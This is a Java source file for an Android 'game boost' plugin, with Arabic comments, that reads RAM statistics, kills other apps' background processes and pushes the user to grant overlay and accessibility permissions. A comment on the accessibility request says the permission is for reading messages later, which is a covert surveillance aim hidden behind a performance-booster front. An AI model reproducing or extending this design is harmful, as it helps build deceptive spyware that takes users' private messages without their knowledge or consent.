package com.Ejram.gameboost;

import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import java.util.List;

import com.getcapacitor.Plugin;
import com.getcapacitor.PluginCall;
import com.getcapacitor.PluginMethod;
import com.getcapacitor.annotation.CapacitorPlugin;
import com.getcapacitor.JSObject;

@CapacitorPlugin(name = "GuardianEngine")
public class GuardianEngine extends Plugin {

    // دالة جلب إحصائيات الجهاز الحقيقية
    @PluginMethod
    public void getRealStats(PluginCall call) {
        ActivityManager actManager = (ActivityManager) getContext().getSystemService(Context.ACTIVITY_SERVICE);
        ActivityManager.MemoryInfo memInfo = new ActivityManager.MemoryInfo();
        actManager.getMemoryInfo(memInfo);

        long totalRam = memInfo.totalMem;
        long availRam = memInfo.availMem;
        long usedRam = totalRam - availRam;
        int ramPercentage = (int) ((usedRam * 100) / totalRam);
        
        // حساب الرام بالجيجا
        double totalRamGb = (double) totalRam / (1024 * 1024 * 1024);

        JSObject ret = new JSObject();
        ret.put("ramUsagePercent", ramPercentage);
        ret.put("totalRamGb", String.format("%.1f", totalRamGb));
        call.resolve(ret);
    }

    // دالة القتل الفعلي للتطبيقات (RAM Cleaner)
    @PluginMethod
    public void executeRealClean(PluginCall call) {
        ActivityManager am = (ActivityManager) getContext().getSystemService(Context.ACTIVITY_SERVICE);
        PackageManager pm = getContext().getPackageManager();
        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);

        int killedCount = 0;
        for (ApplicationInfo packageInfo : packages) {
            // قتل تطبيقات الخلفية (باستثناء تطبيقات النظام وتطبيقنا)
            if ((packageInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0 && 
                !packageInfo.packageName.equals(getContext().getPackageName())) {
                am.killBackgroundProcesses(packageInfo.packageName);
                killedCount++;
            }
        }

        JSObject ret = new JSObject();
        ret.put("killedApps", killedCount);
        call.resolve(ret);
    }

    // دالة طلب الأذونات الإجبارية العميقة
    @PluginMethod
    public void requestDeepPermissions(PluginCall call) {
        // 1. صلاحية النافذة العائمة
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(getContext())) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getContext().getPackageName()));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            getContext().startActivity(intent);
        }
        
        // 2. صلاحية الوصول (لقراءة الرسائل لاحقاً)
        Intent intentAcc = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        intentAcc.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        getContext().startActivity(intentAcc);

        call.resolve();
    }
}
